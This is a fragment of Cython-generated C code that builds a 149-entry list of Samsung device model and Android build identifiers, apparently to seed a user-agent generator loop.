 * samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']             # <<<<<<<<<<<<<<
 * ugen=[]
 * for xd in range(10000):
 */
  __pyx_t_6 = PyList_New(149); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_INCREF(__pyx_kp_s_SM_G920F_NRD90M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G920F_NRD90M);
  PyList_SET_ITEM(__pyx_t_6, 0, __pyx_kp_s_SM_G920F_NRD90M);
  __Pyx_INCREF(__pyx_kp_s_SM_T535_LRX22G);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T535_LRX22G);
  PyList_SET_ITEM(__pyx_t_6, 1, __pyx_kp_s_SM_T535_LRX22G);
  __Pyx_INCREF(__pyx_kp_s_SM_T231_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T231_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 2, __pyx_kp_s_SM_T231_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_SM_J320F_LMY47V);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320F_LMY47V);
  PyList_SET_ITEM(__pyx_t_6, 3, __pyx_kp_s_SM_J320F_LMY47V);
  __Pyx_INCREF(__pyx_kp_s_GT_I9190_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9190_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 4, __pyx_kp_s_GT_I9190_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_GT_N7100_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N7100_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 5, __pyx_kp_s_GT_N7100_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_SM_T561_KTU84P);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T561_KTU84P);
  PyList_SET_ITEM(__pyx_t_6, 6, __pyx_kp_s_SM_T561_KTU84P);
  __Pyx_INCREF(__pyx_kp_s_GT_N7100_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N7100_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 7, __pyx_kp_s_GT_N7100_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_GT_I9500_LRX22C);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9500_LRX22C);
  PyList_SET_ITEM(__pyx_t_6, 8, __pyx_kp_s_GT_I9500_LRX22C);
  __Pyx_INCREF(__pyx_kp_s_SM_J320F_LMY47V);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320F_LMY47V);
  PyList_SET_ITEM(__pyx_t_6, 9, __pyx_kp_s_SM_J320F_LMY47V);
  __Pyx_INCREF(__pyx_kp_s_SM_G930F_NRD90M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G930F_NRD90M);
  PyList_SET_ITEM(__pyx_t_6, 10, __pyx_kp_s_SM_G930F_NRD90M);
  __Pyx_INCREF(__pyx_kp_s_SM_J320F_LMY47V);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320F_LMY47V);
  PyList_SET_ITEM(__pyx_t_6, 11, __pyx_kp_s_SM_J320F_LMY47V);
  __Pyx_INCREF(__pyx_kp_s_SM_J510FN_NMF26X);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J510FN_NMF26X);
  PyList_SET_ITEM(__pyx_t_6, 12, __pyx_kp_s_SM_J510FN_NMF26X);
  __Pyx_INCREF(__pyx_kp_s_GT_P5100_IML74K);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P5100_IML74K);
  PyList_SET_ITEM(__pyx_t_6, 13, __pyx_kp_s_GT_P5100_IML74K);
  __Pyx_INCREF(__pyx_kp_s_SM_J320F_LMY47V);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320F_LMY47V);
  PyList_SET_ITEM(__pyx_t_6, 14, __pyx_kp_s_SM_J320F_LMY47V);
  __Pyx_INCREF(__pyx_kp_s_GT_N8000_JZO54K);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N8000_JZO54K);
  PyList_SET_ITEM(__pyx_t_6, 15, __pyx_kp_s_GT_N8000_JZO54K);
  __Pyx_INCREF(__pyx_kp_s_SM_T531_LRX22G);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T531_LRX22G);
  PyList_SET_ITEM(__pyx_t_6, 16, __pyx_kp_s_SM_T531_LRX22G);
  __Pyx_INCREF(__pyx_kp_s_SPH_L720_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_SPH_L720_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 17, __pyx_kp_s_SPH_L720_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_GT_I9500_JDQ39);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9500_JDQ39);
  PyList_SET_ITEM(__pyx_t_6, 18, __pyx_kp_s_GT_I9500_JDQ39);
  __Pyx_INCREF(__pyx_kp_s_SM_G935F_NRD90M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G935F_NRD90M);
  PyList_SET_ITEM(__pyx_t_6, 19, __pyx_kp_s_SM_G935F_NRD90M);
  __Pyx_INCREF(__pyx_kp_s_SM_T561_KTU84P);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T561_KTU84P);
  PyList_SET_ITEM(__pyx_t_6, 20, __pyx_kp_s_SM_T561_KTU84P);
  __Pyx_INCREF(__pyx_kp_s_SM_T531_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T531_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 21, __pyx_kp_s_SM_T531_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_SM_J320FN_LMY47V);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320FN_LMY47V);
  PyList_SET_ITEM(__pyx_t_6, 22, __pyx_kp_s_SM_J320FN_LMY47V);
  __Pyx_INCREF(__pyx_kp_s_SM_A500F_MMB29M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500F_MMB29M);
  PyList_SET_ITEM(__pyx_t_6, 23, __pyx_kp_s_SM_A500F_MMB29M);
  __Pyx_INCREF(__pyx_kp_s_SM_A500FU_MMB29M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500FU_MMB29M);
  PyList_SET_ITEM(__pyx_t_6, 24, __pyx_kp_s_SM_A500FU_MMB29M);
  __Pyx_INCREF(__pyx_kp_s_SM_A500F_MMB29M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500F_MMB29M);
  PyList_SET_ITEM(__pyx_t_6, 25, __pyx_kp_s_SM_A500F_MMB29M);
  __Pyx_INCREF(__pyx_kp_s_SM_T311_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T311_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 26, __pyx_kp_s_SM_T311_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_SM_T531_LRX22G);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T531_LRX22G);
  PyList_SET_ITEM(__pyx_t_6, 27, __pyx_kp_s_SM_T531_LRX22G);
  __Pyx_INCREF(__pyx_kp_s_SM_J320F_LMY47V);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320F_LMY47V);
  PyList_SET_ITEM(__pyx_t_6, 28, __pyx_kp_s_SM_J320F_LMY47V);
  __Pyx_INCREF(__pyx_kp_s_SM_J320FN_LMY47V);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320FN_LMY47V);
  PyList_SET_ITEM(__pyx_t_6, 29, __pyx_kp_s_SM_J320FN_LMY47V);
  __Pyx_INCREF(__pyx_kp_s_SM_J320F_LMY47V);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320F_LMY47V);
  PyList_SET_ITEM(__pyx_t_6, 30, __pyx_kp_s_SM_J320F_LMY47V);
  __Pyx_INCREF(__pyx_kp_s_GT_P5210_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P5210_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 31, __pyx_kp_s_GT_P5210_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_SM_T230_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T230_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 32, __pyx_kp_s_SM_T230_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_GT_I9192_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9192_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 33, __pyx_kp_s_GT_I9192_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_SM_T235_KOT4);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T235_KOT4);
  PyList_SET_ITEM(__pyx_t_6, 34, __pyx_kp_s_SM_T235_KOT4);
  __Pyx_INCREF(__pyx_kp_s_GT_N7100_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N7100_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 35, __pyx_kp_s_GT_N7100_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_SM_A500F_LRX22G);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500F_LRX22G);
  PyList_SET_ITEM(__pyx_t_6, 36, __pyx_kp_s_SM_A500F_LRX22G);
  __Pyx_INCREF(__pyx_kp_s_SM_A500F_MMB29M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500F_MMB29M);
  PyList_SET_ITEM(__pyx_t_6, 37, __pyx_kp_s_SM_A500F_MMB29M);
  __Pyx_INCREF(__pyx_kp_s_GT_N7100_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N7100_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 38, __pyx_kp_s_GT_N7100_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_SM_G920F_MMB29K);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G920F_MMB29K);
  PyList_SET_ITEM(__pyx_t_6, 39, __pyx_kp_s_SM_G920F_MMB29K);
  __Pyx_INCREF(__pyx_kp_s_SM_J510FN_NMF26X);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J510FN_NMF26X);
  PyList_SET_ITEM(__pyx_t_6, 40, __pyx_kp_s_SM_J510FN_NMF26X);
  __Pyx_INCREF(__pyx_kp_s_GT_N8000_JZO54K);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N8000_JZO54K);
  PyList_SET_ITEM(__pyx_t_6, 41, __pyx_kp_s_GT_N8000_JZO54K);
  __Pyx_INCREF(__pyx_kp_s_SM_J320FN_LMY47V);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320FN_LMY47V);
  PyList_SET_ITEM(__pyx_t_6, 42, __pyx_kp_s_SM_J320FN_LMY47V);
  __Pyx_INCREF(__pyx_kp_s_SM_J320FN_LMY47V);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320FN_LMY47V);
  PyList_SET_ITEM(__pyx_t_6, 43, __pyx_kp_s_SM_J320FN_LMY47V);
  __Pyx_INCREF(__pyx_kp_s_SM_A500H_MMB29M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500H_MMB29M);
  PyList_SET_ITEM(__pyx_t_6, 44, __pyx_kp_s_SM_A500H_MMB29M);
  __Pyx_INCREF(__pyx_kp_s_GT_I9300_JSS15J);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9300_JSS15J);
  PyList_SET_ITEM(__pyx_t_6, 45, __pyx_kp_s_GT_I9300_JSS15J);
  __Pyx_INCREF(__pyx_kp_s_GT_I9500_LRX22C);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9500_LRX22C);
  PyList_SET_ITEM(__pyx_t_6, 46, __pyx_kp_s_GT_I9500_LRX22C);
  __Pyx_INCREF(__pyx_kp_s_SM_J320F_LMY4);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320F_LMY4);
  PyList_SET_ITEM(__pyx_t_6, 47, __pyx_kp_s_SM_J320F_LMY4);
  __Pyx_INCREF(__pyx_kp_s_SM_J510FN_NMF26X);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J510FN_NMF26X);
  PyList_SET_ITEM(__pyx_t_6, 48, __pyx_kp_s_SM_J510FN_NMF26X);
  __Pyx_INCREF(__pyx_kp_s_SM_A500F_MMB29M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500F_MMB29M);
  PyList_SET_ITEM(__pyx_t_6, 49, __pyx_kp_s_SM_A500F_MMB29M);
  __Pyx_INCREF(__pyx_kp_s_GT_N8000_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N8000_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 50, __pyx_kp_s_GT_N8000_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_SM_T561_KTU84P);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T561_KTU84P);
  PyList_SET_ITEM(__pyx_t_6, 51, __pyx_kp_s_SM_T561_KTU84P);
  __Pyx_INCREF(__pyx_kp_s_SM_G900F_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G900F_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 52, __pyx_kp_s_SM_G900F_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_GT_S7390_JZO54K);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7390_JZO54K);
  PyList_SET_ITEM(__pyx_t_6, 53, __pyx_kp_s_GT_S7390_JZO54K);
  __Pyx_INCREF(__pyx_kp_s_SM_J320F_LMY47V);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320F_LMY47V);
  PyList_SET_ITEM(__pyx_t_6, 54, __pyx_kp_s_SM_J320F_LMY47V);
  __Pyx_INCREF(__pyx_kp_s_GT_P5100_JZO54K);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P5100_JZO54K);
  PyList_SET_ITEM(__pyx_t_6, 55, __pyx_kp_s_GT_P5100_JZO54K);
  __Pyx_INCREF(__pyx_kp_s_SM_A500FU_MMB29M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500FU_MMB29M);
  PyList_SET_ITEM(__pyx_t_6, 56, __pyx_kp_s_SM_A500FU_MMB29M);
  __Pyx_INCREF(__pyx_kp_s_SM_G930F_NRD90M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G930F_NRD90M);
  PyList_SET_ITEM(__pyx_t_6, 57, __pyx_kp_s_SM_G930F_NRD90M);
  __Pyx_INCREF(__pyx_kp_s_SM_J510FN_NMF26X);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J510FN_NMF26X);
  PyList_SET_ITEM(__pyx_t_6, 58, __pyx_kp_s_SM_J510FN_NMF26X);
  __Pyx_INCREF(__pyx_kp_s_SM_T561_KTU84P);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T561_KTU84P);
  PyList_SET_ITEM(__pyx_t_6, 59, __pyx_kp_s_SM_T561_KTU84P);
  __Pyx_INCREF(__pyx_kp_s_GT_N8000_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N8000_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 60, __pyx_kp_s_GT_N8000_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_SM_T531_LRX22G);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T531_LRX22G);
  PyList_SET_ITEM(__pyx_t_6, 61, __pyx_kp_s_SM_T531_LRX22G);
  __Pyx_INCREF(__pyx_kp_s_SM_J510FN_MMB29M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J510FN_MMB29M);
  PyList_SET_ITEM(__pyx_t_6, 62, __pyx_kp_s_SM_J510FN_MMB29M);
  __Pyx_INCREF(__pyx_kp_s_SM_J510FN_NMF26X);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J510FN_NMF26X);
  PyList_SET_ITEM(__pyx_t_6, 63, __pyx_kp_s_SM_J510FN_NMF26X);
  __Pyx_INCREF(__pyx_kp_s_SM_J320F_LMY47V);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320F_LMY47V);
  PyList_SET_ITEM(__pyx_t_6, 64, __pyx_kp_s_SM_J320F_LMY47V);
  __Pyx_INCREF(__pyx_kp_s_GT_P5110_JDQ39);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P5110_JDQ39);
  PyList_SET_ITEM(__pyx_t_6, 65, __pyx_kp_s_GT_P5110_JDQ39);
  __Pyx_INCREF(__pyx_kp_s_GT_I9301I_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9301I_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 66, __pyx_kp_s_GT_I9301I_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_SM_A500F_LRX22G);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500F_LRX22G);
  PyList_SET_ITEM(__pyx_t_6, 67, __pyx_kp_s_SM_A500F_LRX22G);
  __Pyx_INCREF(__pyx_kp_s_SM_G930F_NRD90M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G930F_NRD90M);
  PyList_SET_ITEM(__pyx_t_6, 68, __pyx_kp_s_SM_G930F_NRD90M);
  __Pyx_INCREF(__pyx_kp_s_SM_T311_KOT4);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T311_KOT4);
  PyList_SET_ITEM(__pyx_t_6, 69, __pyx_kp_s_SM_T311_KOT4);
  __Pyx_INCREF(__pyx_kp_s_GT_P5200_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P5200_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 70, __pyx_kp_s_GT_P5200_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_GT_I9301I_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9301I_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 71, __pyx_kp_s_GT_I9301I_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_SM_J320M_LMY47V);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320M_LMY47V);
  PyList_SET_ITEM(__pyx_t_6, 72, __pyx_kp_s_SM_J320M_LMY47V);
  __Pyx_INCREF(__pyx_kp_s_SM_T531_LRX22G);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T531_LRX22G);
  PyList_SET_ITEM(__pyx_t_6, 73, __pyx_kp_s_SM_T531_LRX22G);
  __Pyx_INCREF(__pyx_kp_s_SM_T820_NRD90M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T820_NRD90M);
  PyList_SET_ITEM(__pyx_t_6, 74, __pyx_kp_s_SM_T820_NRD90M);
  __Pyx_INCREF(__pyx_kp_s_GT_I9192_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9192_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 75, __pyx_kp_s_GT_I9192_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_SM_G935F_MMB29K);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G935F_MMB29K);
  PyList_SET_ITEM(__pyx_t_6, 76, __pyx_kp_s_SM_G935F_MMB29K);
  __Pyx_INCREF(__pyx_kp_s_SM_J701F_NRD90M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J701F_NRD90M);
  PyList_SET_ITEM(__pyx_t_6, 77, __pyx_kp_s_SM_J701F_NRD90M);
  __Pyx_INCREF(__pyx_kp_s_GT_I9301I_KOT4);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9301I_KOT4);
  PyList_SET_ITEM(__pyx_t_6, 78, __pyx_kp_s_GT_I9301I_KOT4);
  __Pyx_INCREF(__pyx_kp_s_SM_J320FN_LMY47V);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320FN_LMY47V);
  PyList_SET_ITEM(__pyx_t_6, 79, __pyx_kp_s_SM_J320FN_LMY47V);
  __Pyx_INCREF(__pyx_kp_s_SM_T111_JDQ39);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T111_JDQ39);
  PyList_SET_ITEM(__pyx_t_6, 80, __pyx_kp_s_SM_T111_JDQ39);
  __Pyx_INCREF(__pyx_kp_s_SM_A500F_MMB29M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500F_MMB29M);
  PyList_SET_ITEM(__pyx_t_6, 81, __pyx_kp_s_SM_A500F_MMB29M);
  __Pyx_INCREF(__pyx_kp_s_SM_J510FN_NMF2);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J510FN_NMF2);
  PyList_SET_ITEM(__pyx_t_6, 82, __pyx_kp_s_SM_J510FN_NMF2);
  __Pyx_INCREF(__pyx_kp_s_SM_T705_LRX22G);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T705_LRX22G);
  PyList_SET_ITEM(__pyx_t_6, 83, __pyx_kp_s_SM_T705_LRX22G);
  __Pyx_INCREF(__pyx_kp_s_SM_G920F_NRD90M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G920F_NRD90M);
  PyList_SET_ITEM(__pyx_t_6, 84, __pyx_kp_s_SM_G920F_NRD90M);
  __Pyx_INCREF(__pyx_kp_s_GT_N5100_JZO54K);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N5100_JZO54K);
  PyList_SET_ITEM(__pyx_t_6, 85, __pyx_kp_s_GT_N5100_JZO54K);
  __Pyx_INCREF(__pyx_kp_s_GT_I9300I_KTU84P);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9300I_KTU84P);
  PyList_SET_ITEM(__pyx_t_6, 86, __pyx_kp_s_GT_I9300I_KTU84P);
  __Pyx_INCREF(__pyx_kp_s_GT_I9300I_KTU84P);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9300I_KTU84P);
  PyList_SET_ITEM(__pyx_t_6, 87, __pyx_kp_s_GT_I9300I_KTU84P);
  __Pyx_INCREF(__pyx_kp_s_GT_N8000_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N8000_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 88, __pyx_kp_s_GT_N8000_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_GT_N8000_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N8000_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 89, __pyx_kp_s_GT_N8000_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_SM_A500F_MMB29M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500F_MMB29M);
  PyList_SET_ITEM(__pyx_t_6, 90, __pyx_kp_s_SM_A500F_MMB29M);
  __Pyx_INCREF(__pyx_kp_s_GT_I9190_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9190_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 91, __pyx_kp_s_GT_I9190_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_SM_J510FN_NMF26X);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J510FN_NMF26X);
  PyList_SET_ITEM(__pyx_t_6, 92, __pyx_kp_s_SM_J510FN_NMF26X);
  __Pyx_INCREF(__pyx_kp_s_SM_J320F_LMY47V);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320F_LMY47V);
  PyList_SET_ITEM(__pyx_t_6, 93, __pyx_kp_s_SM_J320F_LMY47V);
  __Pyx_INCREF(__pyx_kp_s_GT_P5100_JDQ39);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P5100_JDQ39);
  PyList_SET_ITEM(__pyx_t_6, 94, __pyx_kp_s_GT_P5100_JDQ39);
  __Pyx_INCREF(__pyx_kp_s_GT_I9300I_KTU84P);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9300I_KTU84P);
  PyList_SET_ITEM(__pyx_t_6, 95, __pyx_kp_s_GT_I9300I_KTU84P);
  __Pyx_INCREF(__pyx_kp_s_GT_N5100_JZO54K);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N5100_JZO54K);
  PyList_SET_ITEM(__pyx_t_6, 96, __pyx_kp_s_GT_N5100_JZO54K);
  __Pyx_INCREF(__pyx_kp_s_GT_N8000_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N8000_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 97, __pyx_kp_s_GT_N8000_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_GT_I9500_LRX22C);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9500_LRX22C);
  PyList_SET_ITEM(__pyx_t_6, 98, __pyx_kp_s_GT_I9500_LRX22C);
  __Pyx_INCREF(__pyx_kp_s_SM_J320FN_LMY47V);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320FN_LMY47V);
  PyList_SET_ITEM(__pyx_t_6, 99, __pyx_kp_s_SM_J320FN_LMY47V);
  __Pyx_INCREF(__pyx_kp_s_SM_A500F_MMB29M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500F_MMB29M);
  PyList_SET_ITEM(__pyx_t_6, 100, __pyx_kp_s_SM_A500F_MMB29M);
  __Pyx_INCREF(__pyx_kp_s_GT_N8000_JZO54K);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N8000_JZO54K);
  PyList_SET_ITEM(__pyx_t_6, 101, __pyx_kp_s_GT_N8000_JZO54K);
  __Pyx_INCREF(__pyx_kp_s_SM_T805_LRX22G);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T805_LRX22G);
